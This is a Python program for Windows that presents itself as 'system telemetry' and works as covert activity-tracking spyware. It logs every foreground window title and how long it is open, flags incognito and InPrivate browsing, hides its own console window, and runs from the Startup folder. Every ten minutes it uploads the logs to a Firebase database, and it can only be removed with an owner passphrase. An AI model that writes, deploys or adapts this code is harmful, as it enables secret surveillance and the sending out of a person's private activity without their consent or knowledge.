import ctypes
import time
import os
import sys
import json
import urllib.request
from datetime import datetime

FIREBASE_DB_URL = "https://system-wellbeing-hub-default-rtdb.asia-southeast1.firebasedatabase.app"
UNINSTALL_KEY = "##@@!!owner0813!!@@##"
LOCAL_LOG_PATH = os.path.join(os.path.expanduser("~"), "system_telemetry_cache.json")

user32 = ctypes.windll.user32
LAST_UPLOAD_TIME = time.time()

def get_active_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    if length > 0:
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    return "Idle System Desktop"

def save_to_local_cache(app_name, duration_secs, private_session):
    timestamp_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    new_log = {
        "device": "Windows PC",
        "application": app_name,
        "duration": int(duration_secs),
        "is_private": bool(private_session),
        "timestamp": timestamp_iso
    }
    
    current_cache = []
    if os.path.exists(LOCAL_LOG_PATH):
        try:
            with open(LOCAL_LOG_PATH, "r", encoding="utf-8") as f:
                current_cache = json.load(f)
        except Exception:
            current_cache = []
            
    current_cache.append(new_log)
    with open(LOCAL_LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(current_cache, f, ensure_ascii=False, indent=2)

def upload_batch_to_firebase():
    global LAST_UPLOAD_TIME
    if not os.path.exists(LOCAL_LOG_PATH):
        LAST_UPLOAD_TIME = time.time()
        return
    try:
        with open(LOCAL_LOG_PATH, "r", encoding="utf-8") as f:
            payloads = json.load(f)
        if not payloads:
            LAST_UPLOAD_TIME = time.time()
            return

        endpoint = f"{FIREBASE_DB_URL}/telemetry.json"
        for payload in payloads:
            req = urllib.request.Request(
                endpoint,
                data=json.dumps(payload).encode('utf-8'),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req) as response:
                pass
                
        # Clear cache completely following a verified network sync
        os.remove(LOCAL_LOG_PATH)
        LAST_UPLOAD_TIME = time.time()
    except Exception:
        pass # Hold data and try again on next loop if network drops

def run_telemetry_loop():
    global LAST_UPLOAD_TIME
    last_window = ""
    start_time = time.time()

    while True:
        try:
            current_window = get_active_window_title()
            if current_window != last_window:
                end_time = time.time()
                duration = round(end_time - start_time)
                
                if last_window and duration > 2:
                    is_incognito = any(k in last_window for k in ["Incognito", "InPrivate", "Private Browsing"])
                    save_to_local_cache(last_window, duration, is_incognito)
                        
                last_window = current_window
                start_time = time.time()
                
            # CRITICAL OPTIMIZATION: Push data block every 10 minutes (600 seconds)
            if time.time() - LAST_UPLOAD_TIME >= 600:
                upload_batch_to_firebase()
                
            time.sleep(1)
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--uninstall":
        verification = input("Enter Owner Passphrase to remove tracking module: ")
        if verification == UNINSTALL_KEY:
            try:
                startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup\tracker.exe")
                if os.path.exists(startup_path): os.remove(startup_path)
                if os.path.exists(LOCAL_LOG_PATH): os.remove(LOCAL_LOG_PATH)
                print("[SUCCESS]: Systems purged."); sys.exit(0)
            except Exception as e: print(f"Error: {e}"); sys.exit(1)
        else:
            print("Access Denied."); sys.exit(1)

    console_window = ctypes.windll.kernel32.GetConsoleWindow()
    if console_window != 0: ctypes.windll.user32.ShowWindow(console_window, 0)
    run_telemetry_loop()
